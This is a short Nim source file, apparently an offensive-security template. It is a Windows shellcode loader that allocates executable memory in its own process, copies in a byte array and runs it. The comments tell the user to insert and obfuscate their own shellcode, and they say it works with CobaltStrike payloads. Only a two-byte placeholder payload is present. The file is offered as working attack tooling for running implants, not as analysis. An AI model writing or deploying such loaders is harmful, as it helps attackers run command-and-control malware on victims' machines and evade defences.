#[
    Author: Guillaume Caillé, Twitter: @OffenseTeacher
    License: BSD 3-Clause
]#

import winim
import winim/lean

proc innerMain(shellcode: ptr, size: int): void =
    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](size),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    copyMem(rPtr, shellcode, size)
    let f = cast[proc(){.nimcall.}](rPtr)
    f()

when defined(windows):
    when isMainModule:
        const sc_length: int = 941 #Set the final shellcode length. Is necessary to cast the shellcode as a pointer later

        #Do what you want to obfuscate your shellcode as long as you end with a decoded/decrypted seq[byte] with a length of the sc_length variable
        #Seems to crash with metasploit's messagebox but works fine with CobaltStrike
        var shellcode: seq[byte] = @[byte 0xfc, 0x48] #Replace with your own shellcode

        var shellcodePtr = (cast[ptr array[sc_length, byte]](addr shellcode[0]))
        innerMain(shellcodePtr, len(shellcode))